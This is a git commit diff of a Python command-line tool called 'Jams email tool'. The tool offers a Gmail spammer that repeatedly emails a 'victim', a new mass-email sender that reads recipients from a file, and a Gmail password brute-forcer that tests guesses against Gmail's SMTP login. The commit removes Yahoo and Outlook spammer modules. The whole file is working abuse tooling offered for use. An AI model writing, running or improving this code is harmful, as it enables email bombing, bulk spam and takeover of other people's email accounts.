53a7c5796bdb9b8a6cd5858f4653fef2a06a6f40
Jammy-ez <76751003+Jammy-ez@users.noreply.github.com>
2021-01-28 13:50:19 +0000

    Update
    removed the modules that didn't work and added a new one

--- main.py
+++ main.py
@@ -8,8 +8,6 @@ import pyfiglet
 
 out = pyfiglet.figlet_format("JET", font="doh")
 outstand1 = pyfiglet.figlet_format("Gmail Spammer", font="rectangles")
-outstand2 = pyfiglet.figlet_format("Yahoo Spammer", font="rectangles")
-outstand3 = pyfiglet.figlet_format("Outlook Spammer", font="rectangles")
 outstand4 = pyfiglet.figlet_format("Gmail Bruter", font="rectangles")
 smtp_server = "smtp.gmail.com"
 port = 587
@@ -47,12 +45,8 @@ print("Jams email tool")
 print('''
 --Gmail tools--
 [1] Gmail spammer
-[2] Multi gmail spammer (Spam with multiple emails)
-[3] Gmail bruter (BETA)
---Yahoo tools--
-[4] Yahoo spammer
---Outlook tools--
-[5] Outlook spammer
+[2] Mass email sender
+[3] Gmail bruter 
 (More tools coming soon)
 ''')
 optionfirst = input("Enter option:")
@@ -77,7 +71,7 @@ if optionfirst == '1':
         for times1 in range(times1): #this is the loop and loop counter
             server.sendmail(sender_email, receiver_email, message)
             times2 = str(times1)
-            print("Emails sent: [" + times2 + "]")
+            print("Emails sent: [" + times2 + "] to [" + receiver_email + "]" )
     except Exception as e: #prints the error
         print("Error, sending Exception.. ")
         time.sleep(1)
@@ -96,12 +90,9 @@ if optionfirst == '2':
     print(Fore.BLUE + outstand1)
     sender_email = input(Fore.RED + "Enter your email:") #email for you account
     password = input("Enter password:") #password for your account
-    sender_email2 = input(Fore.RED + "Enter your second email:") #email for you account
-    password2 = input("Enter second password:") #password for your account
-    receiver_email = input("Enter victim:") #victims email
+    receiver_email = input("Enter email list:") #email list
+    receiver_email = open(receiver_email)
     message = input("Enter message:") #message
-    times = input("Enter ammount of times:") #how many times it sends the email
-    times1 = int(times) #changes the string to an int
     context = ssl.create_default_context()
 
     try:
@@ -109,13 +100,15 @@ if optionfirst == '2':
         server.ehlo()
         server.starttls(context=context)
         server.ehlo()
-        for times1 in range(times1): #this is the loop and loop counter
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message)
-            print("Email sent Using: [" + sender_email + "]")
-            server.login(sender_email2, password2)
-            server.sendmail(sender_email2, receiver_email, message)
-            print("Email sent Using: [" + sender_email2 + "]")
+        server.login(sender_email, password)
+        number = 1
+        for emailword in receiver_email: #this is the loop and loop counter
+            server.sendmail(sender_email, emailword, message)
+            print ("[", end = '')
+            print (number, end = '')
+            print ("]", end = '')
+            print(" ")
+            number = number + 1
     except Exception as e: #prints the error
         print("Error, sending Exception.. ")
         time.sleep(1)
@@ -124,8 +117,7 @@ if optionfirst == '2':
         server.quit() #quits
     finally:
         print("")
-
-        print("Finsihed sending all: [" + times2 + "] emails!")
+        print("Sent all all emails")
         time.sleep(1)
         server.quit() #quits after all emails have been sent
 
@@ -154,70 +146,3 @@ if optionfirst == '3':
                 print("[-] Password Correct, email verification on: " + password)
             elif e.smtp_code == 535:
                 print("[-] Password incorrect: " + password)
-if optionfirst == '4':
-    clear()
-    print(Fore.BLUE + outstand2)
-    sender_email = input(Fore.RED + "Enter your email:") #email for you account
-    password = input("Enter password:") #password for your account
-    receiver_email = input("Enter victim:") #victims email
-    message = input("Enter message:") #message
-    times = input("Enter ammount of times:") #how many times it sends the email
-    times1 = int(times) #changes the string to an int
-    context = ssl.create_default_context()
-
-    try:
-        server1 = smtplib.SMTP("smtp.mail.yahoo.com", 587)
-        server1.ehlo()
-        server1.starttls(context=context)
-        server1.ehlo()
-        server1.login(sender_email, password)
-        for times1 in range(times1): #this is the loop and loop counter
-            server1.sendmail(sender_email, receiver_email, message)
-            times2 = str(times1)
-            print("Emails sent: [" + times2 + "]")
-    except Exception as e: #prints the error
-        print("Error, sending Exception.. ")
-        time.sleep(1)
-        print(e)
-        time.sleep(10)
-        serve1r.quit() #quits
-    finally:
-        print("")
-
-        print("Finsihed sending all: [" + times2 + "] emails!")
-        time.sleep(1)
-        server1.quit() #quits after all emails have been sent
-
-if optionfirst == '5':
-    clear()
-    print(Fore.BLUE + outstand3)
-    sender_email = input(Fore.RED + "Enter your email:") #email for you account
-    password = input("Enter password:") #password for your account
-    receiver_email = input("Enter victim:") #victims email
-    message = input("Enter message:") #message
-    times = input("Enter ammount of times:") #how many times it sends the email
-    times1 = int(times) #changes the string to an int
-    context = ssl.create_default_context()
-
-    try:
-        server2 = smtplib.SMTP("smtp.mail.outlook.com", 587)
-        server2.ehlo()
-        server2.starttls(context=context)
-        server2.ehlo()
-        server2.login(sender_email, password)
-        for times1 in range(times1): #this is the loop and loop counter
-            server2.sendmail(sender_email, receiver_email, message)
-            times2 = str(times1)
-            print("Emails sent: [" + times2 + "]")
-    except Exception as e: #prints the error
-        print("Error, sending Exception.. ")
-        time.sleep(1)
-        print(e)
-        time.sleep(10)
-        server2.quit() #quits
-    finally:
-        print("")
-
-        print("Finsihed sending all: [" + times2 + "] emails!")
-        time.sleep(1)
-        server2.quit() #quits after all emails have been sent
